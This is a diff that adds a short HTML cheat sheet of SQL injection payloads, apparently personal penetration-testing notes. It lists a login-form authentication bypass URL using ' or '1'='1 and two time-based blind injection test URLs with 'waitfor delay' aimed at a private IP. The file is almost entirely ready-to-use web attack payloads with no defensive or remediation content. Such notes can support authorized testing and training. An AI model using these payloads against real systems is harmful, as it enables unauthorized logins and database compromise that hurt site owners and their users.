@@ -1,0 +1,24 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Detection</title>
+</head><body><b><span style="font-size: 12pt">ERROR BASED</span></b><br/>
+<br/>
+<b>Specific DB characters</b><br/>
+<br/>
+;	query separator<br/>
+--	comment<br/>
+<br/>
+<b>Basic login form auth bypass<span style="font-size: 12pt"><br/>
+</span></b><tt><span style="font-size: 10pt"><br/>
+</span></tt><tt><span style="font-size: 10pt">https:/vulnerable.web.app/login.asp?Username='%20or%20'1'='1&amp;Password='%20or%20'1'='1</span></tt><b><span style="font-size: 12pt"><br/>
+</span></b><b><span style="font-size: 12pt"><br/>
+</span></b><b><span style="font-size: 12pt">BLIND</span></b><br/>
+<br/>
+<b>Test for SQLi vulnerabilty - time sleep<br/>
+</b><br/>
+If response take more then 5 secs we have SQLi (assuming id is string parameter)<b><br/>
+</b><tt>http://10.11.13.67/comment.php?id=738'; waitfor delay '0:0:5'--<br/>
+</tt>If response take more then 5 secs we have SQLi (assuming id is number parameter)<b><br/>
+</b><tt>http://10.11.13.67/comment.php?id=738; waitfor delay '0:0:5'--<br/>
+</tt></body></html>
